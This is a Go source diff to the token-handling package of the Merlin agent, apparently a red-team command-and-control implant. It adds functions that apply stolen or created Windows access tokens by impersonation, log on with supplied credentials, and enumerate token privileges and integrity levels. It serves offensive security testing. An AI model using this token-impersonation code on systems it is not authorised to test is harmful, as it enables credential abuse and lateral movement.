@@ -33,14 +33,58 @@ import (
 	"golang.org/x/sys/windows"
 
 	// Internal
+	"github.com/Ne0nd0g/merlin-agent/cli"
 	"github.com/Ne0nd0g/merlin-agent/os/windows/api/advapi32"
 	"github.com/Ne0nd0g/merlin-agent/os/windows/pkg/pipes"
 )
+
+// LOGON32_LOGON_ constants from winbase.h
+// The type of logon operation to perform
+const (
+	LOGON32_LOGON_INTERACTIVE       uint32 = 2
+	LOGON32_LOGON_NETWORK           uint32 = 3
+	LOGON32_LOGON_BATCH             uint32 = 4
+	LOGON32_LOGON_SERVICE           uint32 = 5
+	LOGON32_LOGON_UNLOCK            uint32 = 7
+	LOGON32_LOGON_NETWORK_CLEARTEXT uint32 = 8
+	LOGON32_LOGON_NEW_CREDENTIALS   uint32 = 9
+)
+
+// LOGON32_PROVIDER_ constants
+// The logon provider
+const (
+	LOGON32_PROVIDER_DEFAULT uint32 = iota
+	LOGON32_PROVIDER_WINNT35
+	LOGON32_PROVIDER_WINNT40
+	LOGON32_PROVIDER_WINNT50
+	LOGON32_PROVIDER_VIRTUAL
+)
+
+// LOGON_ The logon option
+const (
+	LOGON_WITH_PROFILE        uint32 = 0x1
+	LOGON_NETCREDENTIALS_ONLY uint32 = 0x2
+)
+
+var Token windows.Token
+
+// ApplyToken applies any stolen or created Windows access token's to the current thread
+func ApplyToken() error {
+	cli.Message(cli.DEBUG, "entering tokens.ApplyToken()")
+
+	// Verify a token has been created/stolen and assigned to the global variable
+	if Token != 0 {
+		// Apply the token to this process thread
+		return advapi32.ImpersonateLoggedOnUser(Token)
+	}
+	return nil
+}
 
 // CreateProcessWithToken creates a new process as the user associated with the passed in token
 // STDOUT/STDERR is redirected to an anonymous pipe and collected after execution to be returned
 // This requires administrative privileges or at least the SE_IMPERSONATE_NAME privilege
 func CreateProcessWithToken(hToken windows.Token, application string, args []string) (stdout string, stderr string) {
+	cli.Message(cli.DEBUG, "entering tokens.CreateProcessWithToken()")
 	if application == "" {
 		stderr = "a program must be provided for the CreateProcessWithToken call"
 		return
@@ -157,7 +201,7 @@ func CreateProcessWithToken(hToken windows.Token, application string, args []str
 		return
 	}
 
-	stdout += fmt.Sprintf("Created proccess with an ID of %d\n", lpProcessInformation.ProcessId)
+	stdout += fmt.Sprintf("Created %s proccess with an ID of %d\n", application, lpProcessInformation.ProcessId)
 
 	// Close the "write" pipe handles
 	err = pipes.ClosePipes(0, 0, 0, stdOutWrite, 0, stdErrWrite)
@@ -167,7 +211,8 @@ func CreateProcessWithToken(hToken windows.Token, application string, args []str
 	}
 
 	// Read from the pipes
-	_, out, stderr, err := pipes.ReadPipes(0, stdOutRead, stdErrRead)
+	var out string
+	_, out, stderr, err = pipes.ReadPipes(0, stdOutRead, stdErrRead)
 	if err != nil {
 		stderr += err.Error()
 	}
@@ -183,8 +228,134 @@ func CreateProcessWithToken(hToken windows.Token, application string, args []str
 	return
 }
 
+// GetTokenIntegrityLevel enumerates the integrity level for the provided token and returns it as a string
+func GetTokenIntegrityLevel(token windows.Token) (string, error) {
+	cli.Message(cli.DEBUG, "entering tokens.GetTokenIntegrityLevel()")
+	var info byte
+	var returnedLen uint32
+	// Call the first time to get the output structure size
+	err := windows.GetTokenInformation(token, windows.TokenIntegrityLevel, &info, 0, &returnedLen)
+	if err != windows.ERROR_INSUFFICIENT_BUFFER {
+		return "", fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
+	}
+
+	// Knowing the structure size, call again
+	TokenIntegrityInformation := bytes.NewBuffer(make([]byte, returnedLen))
+	err = windows.GetTokenInformation(token, windows.TokenIntegrityLevel, &TokenIntegrityInformation.Bytes()[0], returnedLen, &returnedLen)
+	if err != nil {
+		return "", fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
+	}
+
+	// Read the buffer into a byte slice
+	bLabel := make([]byte, returnedLen)
+	err = binary.Read(TokenIntegrityInformation, binary.LittleEndian, &bLabel)
+	if err != nil {
+		return "", fmt.Errorf("there was an error reading bytes for the token integrity level: %s", err)
+	}
+
+	// Integrity level is in the Attributes portion of the structure, a DWORD, the last four bytes
+	// https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_mandatory_label
+	// https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-sid_and_attributes
+	integrityLevel := binary.LittleEndian.Uint32(bLabel[returnedLen-4:])
+	return integrityLevelToString(integrityLevel), nil
+}
+
+// GetTokenPrivileges enumerates the token's privileges and attributes and returns them
+func GetTokenPrivileges(token windows.Token) (privs []windows.LUIDAndAttributes, err error) {
+	cli.Message(cli.DEBUG, "entering tokens.GetTokenPrivileges()")
+	// Get the privileges and attributes
+	// Call to get structure size
+	var returnedLen uint32
+	err = windows.GetTokenInformation(token, windows.TokenPrivileges, nil, 0, &returnedLen)
+	if err != syscall.ERROR_INSUFFICIENT_BUFFER {
+		err = fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
+		return
+	}
+
+	// Call again to get the actual structure
+	info := bytes.NewBuffer(make([]byte, returnedLen))
+	err = windows.GetTokenInformation(token, windows.TokenPrivileges, &info.Bytes()[0], returnedLen, &returnedLen)
+	if err != nil {
+		err = fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
+		return
+	}
+
+	var privilegeCount uint32
+	err = binary.Read(info, binary.LittleEndian, &privilegeCount)
+	if err != nil {
+		err = fmt.Errorf("there was an error reading TokenPrivileges bytes to privilegeCount: %s", err)
+		return
+	}
+
+	// Read in the LUID and Attributes
+	for i := 1; i <= int(privilegeCount); i++ {
+		var priv windows.LUIDAndAttributes
+		err = binary.Read(info, binary.LittleEndian, &priv)
+		if err != nil {
+			err = fmt.Errorf("there was an error reading LUIDAttributes to bytes: %s", err)
+			return
+		}
+		privs = append(privs, priv)
+	}
+	return
+}
+
+// GetTokenStats uses the GetTokenInformation Windows API call to gather information about the provided access token
+// by retrieving the token's associated TOKEN_STATISTICS structure
+func GetTokenStats(token windows.Token) (tokenStats TOKEN_STATISTICS, err error) {
+	cli.Message(cli.DEBUG, "entering tokens.GetTokenStats()")
+	// Determine the size needed for the structure
+	// BOOL GetTokenInformation(
+	//  [in]            HANDLE                  TokenHandle,
+	//  [in]            TOKEN_INFORMATION_CLASS TokenInformationClass,
+	//  [out, optional] LPVOID                  TokenInformation,
+	//  [in]            DWORD                   TokenInformationLength,
+	//  [out]           PDWORD                  ReturnLength
+	//);
+	var returnLength uint32
+	err = windows.GetTokenInformation(token, windows.TokenStatistics, nil, 0, &returnLength)
+	if err != nil && err != syscall.ERROR_INSUFFICIENT_BUFFER {
+		err = fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
+		return
+	}
+
+	// Make the call with the known size of the object
+	info := bytes.NewBuffer(make([]byte, returnLength))
+	var returnLength2 uint32
+	err = windows.GetTokenInformation(token, windows.TokenStatistics, &info.Bytes()[0], returnLength, &returnLength2)
+	if err != nil {
+		err = fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
+		return
+	}
+
+	err = binary.Read(info, binary.LittleEndian, &tokenStats)
+	if err != nil {
+		err = fmt.Errorf("there was an error reading binary into the TOKEN_STATISTICS structure: %s", err)
+		return
+	}
+	return
+}
+
+// GetTokenUsername returns the domain and username associated with the provided token as a string
+func GetTokenUsername(token windows.Token) (username string, err error) {
+	cli.Message(cli.DEBUG, "entering tokens.GetTokenUsername()")
+	user, err := token.GetTokenUser()
+	if err != nil {
+		return "", fmt.Errorf("there was an error calling GetTokenUser(): %s", err)
+	}
+
+	account, domain, _, err := user.User.Sid.LookupAccount("")
+	if err != nil {
+		return "", fmt.Errorf("there was an error calling SID.LookupAccount(): %s", err)
+	}
+
+	username = fmt.Sprintf("%s\\%s", domain, account)
+	return
+}
+
 // hasPrivilege checks the provided access token to see if it contains the provided privilege
 func hasPrivilege(token windows.Token, privilege windows.LUID) (has bool, err error) {
+	cli.Message(cli.DEBUG, "entering tokens.hasPrivilege()")
 	// Get the privileges and attributes
 	// Call to get structure size
 	var returnedLen uint32
@@ -228,4 +399,186 @@ func hasPrivilege(token windows.Token, privilege windows.LUID) (has bool, err er
 		}
 	}
 	return false, nil
+}
+
+// integrityLevelToString converts an access token integrity level to a string
+// https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids
+func integrityLevelToString(level uint32) string {
+	switch level {
+	case 0x00000000: // SECURITY_MANDATORY_UNTRUSTED_RID
+		return "Untrusted"
+	case 0x00001000: // SECURITY_MANDATORY_LOW_RID
+		return "Low"
+	case 0x00002000: // SECURITY_MANDATORY_MEDIUM_RID
+		return "Medium"
+	case 0x00002100: // SECURITY_MANDATORY_MEDIUM_PLUS_RID
+		return "Medium High"
+	case 0x00003000: // SECURITY_MANDATORY_HIGH_RID
+		return "High"
+	case 0x00004000: // SECURITY_MANDATORY_SYSTEM_RID
+		return "System"
+	case 0x00005000: // SECURITY_MANDATORY_PROTECTED_PROCESS_RID
+		return "Protected Process"
+	default:
+		return fmt.Sprintf("Uknown integrity level: %d", level)
+	}
+}
+
+// ImpersonationToString converts a SECURITY_IMPERSONATION_LEVEL uint32 value to it's associated string
+func ImpersonationToString(level uint32) string {
+	switch level {
+	case windows.SecurityAnonymous:
+		return "Anonymous"
+	case windows.SecurityIdentification:
+		return "Identification"
+	case windows.SecurityImpersonation:
+		return "Impersonation"
+	case windows.SecurityDelegation:
+		return "Delegation"
+	default:
+		return fmt.Sprintf("unknown SECURITY_IMPERSONATION_LEVEL: %d", level)
+	}
+}
+
+// LogonUser creates a new logon session for the user according to the provided logon type and returns a Windows access
+// token for that logon session. This is a wrapper function that includes additional validation checks
+func LogonUser(user string, password string, domain string, logonType uint32, logonProvider uint32) (hToken windows.Token, err error) {
+	cli.Message(cli.DEBUG, "entering tokens.LogonUser()")
+	if user == "" {
+		err = fmt.Errorf("a username must be provided for the LogonUser call")
+		return
+	}
+
+	if password == "" {
+		err = fmt.Errorf("a password must be provided for the LogonUser call")
+		return
+	}
+
+	if logonType <= 0 {
+		err = fmt.Errorf("an invalid logonType was provided to the LogonUser call: %d", logonType)
+		return
+	}
+
+	// Check for UPN format (e.g., rastley@acme.com)
+	if strings.Contains(user, "@") {
+		temp := strings.Split(user, "@")
+		user = temp[0]
+		domain = temp[1]
+	}
+
+	// Check for domain format (e.g., ACME\rastley)
+	if strings.Contains(user, "\\") {
+		temp := strings.Split(user, "\\")
+		user = temp[1]
+		domain = temp[0]
+	}
+
+	// Check for an empty or missing domain; used with local user accounts
+	if domain == "" {
+		domain = "."
+	}
+
+	// Convert username to LPCWSTR
+	pUser, err := syscall.UTF16PtrFromString(user)
+	if err != nil {
+		err = fmt.Errorf("there was an error converting the username \"%s\" to LPCWSTR: %s", user, err)
+		return
+	}
+
+	// Convert the domain to LPCWSTR
+	pDomain, err := syscall.UTF16PtrFromString(domain)
+	if err != nil {
+		err = fmt.Errorf("there was an error converting the domain \"%s\" to LPCWSTR: %s", domain, err)
+		return
+	}
+
+	// Convert the password to LPCWSTR
+	pPassword, err := syscall.UTF16PtrFromString(password)
+	if err != nil {
+		err = fmt.Errorf("there was an error converting the password \"%s\" to LPCWSTR: %s", password, err)
+		return
+	}
+
+	token, err := advapi32.LogonUser(pUser, pDomain, pPassword, logonType, logonProvider)
+	if err != nil {
+		return
+	}
+
+	// Convert *unsafe.Pointer to windows.Token
+	// windows.Token -> windows.Handle -> uintptr
+	hToken = (windows.Token)(*token)
+	return
+}
+
+// PrivilegeAttributeToString converts a privilege attribute integer to a string
+func PrivilegeAttributeToString(attribute uint32) string {
+	// https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_privileges
+	switch attribute {
+	case 0x00000000:
+		return ""
+	case 0x00000001:
+		return "SE_PRIVILEGE_ENABLED_BY_DEFAULT"
+	case 0x00000002:
+		return "SE_PRIVILEGE_ENABLED"
+	case 0x00000001 | 0x00000002:
+		return "SE_PRIVILEGE_ENABLED_BY_DEFAULT,SE_PRIVILEGE_ENABLED"
+	case 0x00000004:
+		return "SE_PRIVILEGE_REMOVED"
+	case 0x80000000:
+		return "SE_PRIVILEGE_USED_FOR_ACCESS"
+	case 0x00000001 | 0x00000002 | 0x00000004 | 0x80000000:
+		return "SE_PRIVILEGE_VALID_ATTRIBUTES"
+	default:
+		return fmt.Sprintf("Unknown SE_PRIVILEGE_ value: 0x%X", attribute)
+	}
+}
+
+// PrivilegeToString converts a LUID to it's string representation
+func PrivilegeToString(priv windows.LUID) string {
+	p, err := advapi32.LookupPrivilegeName(priv)
+	if err != nil {
+		return err.Error()
+	}
+	return p
+}
+
+// TokenTypeToString converts a TOKEN_TYPE uint32 value to it's associated string
+func TokenTypeToString(tokenType uint32) string {
+	switch tokenType {
+	case windows.TokenPrimary:
+		return "Primary"
+	case windows.TokenImpersonation:
+		return "Impersonation"
+	default:
+		return fmt.Sprintf("unknown TOKEN_TYPE: %d", tokenType)
+	}
+}
+
+// Structures
+
+// TOKEN_STATISTICS contains information about an access token
+// https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_statistics
+// typedef struct _TOKEN_STATISTICS {
+//  LUID                         TokenId;
+//  LUID                         AuthenticationId;
+//  LARGE_INTEGER                ExpirationTime;
+//  TOKEN_TYPE                   TokenType;
+//  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
+//  DWORD                        DynamicCharged;
+//  DWORD                        DynamicAvailable;
+//  DWORD                        GroupCount;
+//  DWORD                        PrivilegeCount;
+//  LUID                         ModifiedId;
+//} TOKEN_STATISTICS, *PTOKEN_STATISTICS;
+type TOKEN_STATISTICS struct {
+	TokenId            windows.LUID
+	AuthenticationId   windows.LUID
+	ExpirationTime     int64
+	TokenType          uint32 // Enum of TokenPrimary 0 or TokenImpersonation 1
+	ImpersonationLevel uint32 // Enum
+	DynamicCharged     uint32
+	DynamicAvailable   uint32
+	GroupCount         uint32
+	PrivilegeCount     uint32
+	ModifiedId         windows.LUID
 }
